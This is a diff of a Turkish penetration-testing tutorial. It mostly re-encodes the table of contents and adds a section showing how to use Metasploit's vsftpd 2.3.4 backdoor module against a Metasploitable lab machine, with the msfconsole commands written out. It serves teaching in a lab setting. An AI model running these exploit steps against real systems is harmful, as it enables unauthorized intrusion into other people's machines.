@@ -1,23 +1,23 @@
 # İçindekiler
-- [İçindekiler](#%c4%b0%c3%a7indekiler)
-- [Giriş](#giri%c5%9f)
-- [Sanal Makina (VirtualBox vb.) Ağ Yapılandırması](#sanal-makina-virtualbox-vb-a%c4%9f-yap%c4%b1land%c4%b1rmas%c4%b1)
+- [İçindekiler](#i̇çindekiler)
+- [Giriş](#giriş)
+- [Sanal Makina (VirtualBox vb.) Ağ Yapılandırması](#sanal-makina-virtualbox-vb-ağ-yapılandırması)
   - [NAT Mod](#nat-mod)
   - [Bridge Mod](#bridge-mod)
   - [Host Only Mod](#host-only-mod)
-- [Ağlara Giriş](#a%c4%9flara-giri%c5%9f)
-  - [İletişim Nedir?](#%c4%b0leti%c5%9fim-nedir)
-  - [Ağ Nedir?](#a%c4%9f-nedir)
-  - [İnternet Nedir?](#%c4%b0nternet-nedir)
-  - [Önemli Ağ Terimleri](#%c3%96nemli-a%c4%9f-terimleri)
+- [Ağlara Giriş](#ağlara-giriş)
+  - [İletişim Nedir?](#i̇letişim-nedir)
+  - [Ağ Nedir?](#ağ-nedir)
+  - [İnternet Nedir?](#i̇nternet-nedir)
+  - [Önemli Ağ Terimleri](#önemli-ağ-terimleri)
     - [Sunucu](#sunucu)
     - [Hyperconverged Cihazlar](#hyperconverged-cihazlar)
-    - [Uç Sistemler - Uç Birimler](#u%c3%a7-sistemler---u%c3%a7-birimler)
+    - [Uç Sistemler - Uç Birimler](#uç-sistemler---uç-birimler)
     - [Paketler](#paketler)
-    - [Veri İletişimi (Data Transmission)](#veri-%c4%b0leti%c5%9fimi-data-transmission)
-    - [Ağ Protokolü Nedir?](#a%c4%9f-protokol%c3%bc-nedir)
+    - [Veri İletişimi (Data Transmission)](#veri-i̇letişimi-data-transmission)
+    - [Ağ Protokolü Nedir?](#ağ-protokolü-nedir)
     - [TCP/IP](#tcpip)
-      - [TCP/IP Katmanlarında Kullanılan Bazı Protokoller](#tcpip-katmanlar%c4%b1nda-kullan%c4%b1lan-baz%c4%b1-protokoller)
+      - [TCP/IP Katmanlarında Kullanılan Bazı Protokoller](#tcpip-katmanlarında-kullanılan-bazı-protokoller)
     - [OSI (Open Systems Interconnection) Referans Modeli](#osi-open-systems-interconnection-referans-modeli)
       - [OSI Referans Modelindeki 7 Katman](#osi-referans-modelindeki-7-katman)
     - [MAC Adresi](#mac-adresi)
@@ -26,54 +26,55 @@
     - [DNS (Domain Name Server)](#dns-domain-name-server)
     - [ARP (Address Resolution Protocol)](#arp-address-resolution-protocol)
     - [VPN (Virtual Private Network)](#vpn-virtual-private-network)
-    - [Firewall (Güvenlik Duvarı)](#firewall-g%c3%bcvenlik-duvar%c4%b1)
+    - [Firewall (Güvenlik Duvarı)](#firewall-güvenlik-duvarı)
       - [UFW (Uncomplicated Firewall)](#ufw-uncomplicated-firewall)
-  - [Cihazların İletişime Başlaması](#cihazlar%c4%b1n-%c4%b0leti%c5%9fime-ba%c5%9flamas%c4%b1)
+  - [Cihazların İletişime Başlaması](#cihazların-i̇letişime-başlaması)
     - [Handshake (3-Way Handshake)](#handshake-3-way-handshake)
     - [Syn Paketi](#syn-paketi)
     - [ACK Paketi](#ack-paketi)
-  - [VPN Kullanımı](#vpn-kullan%c4%b1m%c4%b1)
-  - [DNS Değiştirmek](#dns-de%c4%9fi%c5%9ftirmek)
+  - [VPN Kullanımı](#vpn-kullanımı)
+  - [DNS Değiştirmek](#dns-değiştirmek)
 - [Dark Web](#dark-web)
-  - [Tor Browser Yüklemek](#tor-browser-y%c3%bcklemek)
+  - [Tor Browser Yüklemek](#tor-browser-yüklemek)
 - [Ufak Bir Terminal Trick'i](#ufak-bir-terminal-tricki)
-- [Ağlara Saldırmak](#a%c4%9flara-sald%c4%b1rmak)
-  - [Saldırı Öncesi Ayarlar](#sald%c4%b1r%c4%b1-%c3%96ncesi-ayarlar)
-    - [MAC Adresi Değiştirmek](#mac-adresi-de%c4%9fi%c5%9ftirmek)
+- [Ağlara Saldırmak](#ağlara-saldırmak)
+  - [Saldırı Öncesi Ayarlar](#saldırı-öncesi-ayarlar)
+    - [MAC Adresi Değiştirmek](#mac-adresi-değiştirmek)
     - [Monitor ve Managed Mod](#monitor-ve-managed-mod)
-        - [Mod Değiştirmek İçin 1. Yöntem (airmon-ng)](#mod-de%c4%9fi%c5%9ftirmek-%c4%b0%c3%a7in-1-y%c3%b6ntem-airmon-ng)
-        - [Mod Değiştirmek İçin 2. Yöntem (iwconfig)](#mod-de%c4%9fi%c5%9ftirmek-%c4%b0%c3%a7in-2-y%c3%b6ntem-iwconfig)
-  - [Ağlarla İlgili Bilgi Toplamak](#a%c4%9flarla-%c4%b0lgili-bilgi-toplamak)
-    - [Ağları İncelemek (Sniffing)](#a%c4%9flar%c4%b1-%c4%b0ncelemek-sniffing)
-    - [Belirli Bir Ağa Özel Bilgi Edinmek](#belirli-bir-a%c4%9fa-%c3%96zel-bilgi-edinmek)
-    - [Deauth Saldırısı](#deauth-sald%c4%b1r%c4%b1s%c4%b1)
-  - [Ağlara Saldırmak](#a%c4%9flara-sald%c4%b1rmak-1)
-    - [Encryption (Şifreleme Modelleri)](#encryption-%c5%9eifreleme-modelleri)
+        - [Mod Değiştirmek İçin 1. Yöntem (airmon-ng)](#mod-değiştirmek-i̇çin-1-yöntem-airmon-ng)
+        - [Mod Değiştirmek İçin 2. Yöntem (iwconfig)](#mod-değiştirmek-i̇çin-2-yöntem-iwconfig)
+  - [Ağlarla İlgili Bilgi Toplamak](#ağlarla-i̇lgili-bilgi-toplamak)
+    - [Ağları İncelemek (Sniffing)](#ağları-i̇ncelemek-sniffing)
+    - [Belirli Bir Ağa Özel Bilgi Edinmek](#belirli-bir-ağa-özel-bilgi-edinmek)
+    - [Deauth Saldırısı](#deauth-saldırısı)
+  - [Ağlara Saldırmak](#ağlara-saldırmak-1)
+    - [Encryption (Şifreleme Modelleri)](#encryption-şifreleme-modelleri)
       - [WEP](#wep)
         - [WEP Cracking](#wep-cracking)
         - [Fake Auth (Sahte Yetkilendirme)](#fake-auth-sahte-yetkilendirme)
         - [Package Injection (Paket Enjeksiyonu)](#package-injection-paket-enjeksiyonu)
       - [WPA](#wpa)
         - [Handshake Yakalamak](#handshake-yakalamak)
-        - [Wordlist Oluşturmak](#wordlist-olu%c5%9fturmak)
-        - [Handshake'e Karşı Wordlist Kullanmak](#handshakee-kar%c5%9f%c4%b1-wordlist-kullanmak)
-  - [Bağlantı Sonrası Yapılacaklar](#ba%c4%9flant%c4%b1-sonras%c4%b1-yap%c4%b1lacaklar)
-    - [Bağlandığımız Ağları İncelemek](#ba%c4%9fland%c4%b1%c4%9f%c4%b1m%c4%b1z-a%c4%9flar%c4%b1-%c4%b0ncelemek)
+        - [Wordlist Oluşturmak](#wordlist-oluşturmak)
+        - [Handshake'e Karşı Wordlist Kullanmak](#handshakee-karşı-wordlist-kullanmak)
+  - [Bağlantı Sonrası Yapılacaklar](#bağlantı-sonrası-yapılacaklar)
+    - [Bağlandığımız Ağları İncelemek](#bağlandığımız-ağları-i̇ncelemek)
       - [Netdiscover](#netdiscover)
       - [Nmap](#nmap)
       - [Wireshark](#wireshark)
     - [Man In The Middle (Ortadaki Adam/MITM)](#man-in-the-middle-ortadaki-adammitm)
-      - [ARP Spoof (ARP Kandırma)](#arp-spoof-arp-kand%c4%b1rma)
+      - [ARP Spoof (ARP Kandırma)](#arp-spoof-arp-kandırma)
     - [Web Sunucu Kurmak](#web-sunucu-kurmak)
     - [Bettercap](#bettercap)
       - [Bettercap ile ARP Spoof](#bettercap-ile-arp-spoof)
-      - [Bilgileri Çalmak](#bilgileri-%c3%87almak)
-    - [HTTPS Kırmak](#https-k%c4%b1rmak)
-- [Bilgisayarları Ele Geçirmek](#bilgisayarlar%c4%b1-ele-ge%c3%a7irmek)
+      - [Bilgileri Çalmak](#bilgileri-çalmak)
+    - [HTTPS Kırmak](#https-kırmak)
+- [Bilgisayarları Ele Geçirmek](#bilgisayarları-ele-geçirmek)
   - [Metasploitable](#metasploitable)
   - [Zenmap](#zenmap)
     - [Kurulum](#kurulum)
-    - [Kullanım](#kullan%c4%b1m)
+    - [Kullanım](#kullanım)
+  - [Msfconsole](#msfconsole)
 
 # Giriş
 Bu döküman **Linux** işletim sisteminin **Kali Linux** dağıtımı üzerinde hazırlanmıştır. İlgili sistem bilgileri aşağıda bulunmaktadır.<br>
@@ -803,4 +804,53 @@ Metasploitable içerisinde de Linux komutlarını çalıştırabiliriz.
 - Orta kısımdaki **Command** kısmı ise `nmap`'te aynı işlemi yapmamız için kullanmamız gereken komut dizilimini göstermektedir. Dilersek `nmap` açarak ve ilgili komut dizilimini kullanarak da aynı sonuçları elde edebiliriz
 
 ![Zenmap Info](./assets/21-zenmap-info.png)
+
+## Msfconsole
+Terminale `msfconsole` yazarak tool'u çalıştırabiliriz. İçerisinde bir çok **exploit**  bulundurmaktadır. <br>
+Temel komut dizilimi şu şekildedir: `use <exploit_adi>`
+- Metasploitable cihazımıza karşı Zenmap ile taramamız sonucu elde ettiğimiz 21 Portunda çalışan FTP servisinin `vsftpd 2.3.4` versiyonlu açığını kullanacağız
+
+![Zenmap Metasploitable](./assets/22-zenmap-metasploitable.png)
+
+- Bulduğumuz versiyon ile google da basit bir `vsftpd 2.3.4 exploit` şeklinde arama gerçekleştiriyoruz
+- Örnek adrese [buradan](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor) erişebilirsiniz
+- Aşağıda (örnek adres için geçerli, diğer sitelerde konum değişebilir) ki gibi **işaretli** alanı kopyalayıp `msfconsole` içerisinde kullanmamız gerekiyor
+
+![msfconsole version](./assets/23-exploit-version.png)
+
+- Hangi exploiti kullanmak istediğimizi belirtiyoruz
+```
+msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > 
+```
+- `show options` ile seçenekleri/parametreleri görebiliriz. Buradaki **RHOST** hedef IP'yi temsil etmektedir. **RPORT** ise hedef ile hangi port üzerinden iletişime geçmek istediğimizi belirtir
+```
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+>>> module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT   21               yes       The target port (TCP)
+
+                                                                                                                                                                      
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+```
+- `set RHOSTS <IP>` ile Hedef IP'yi, `set RPORT <PORT>` ile iletiişim için kullanılacak port numarasını set edebiliriz
+```
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.179
+>>> RHOSTS => 192.168.1.179
+msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RPORT 21
+>>> RPORT => 21
+```
+- `exploit` komutunu çalıştırarak hedef cihazı sömürmeye başlayabiliriz
+
+![exploit success](./assets/24-exploit-success.png)
+
+- Diğer exploitleri kullanmak için de basit bir şekilde google'da arama yapabiliriz
 
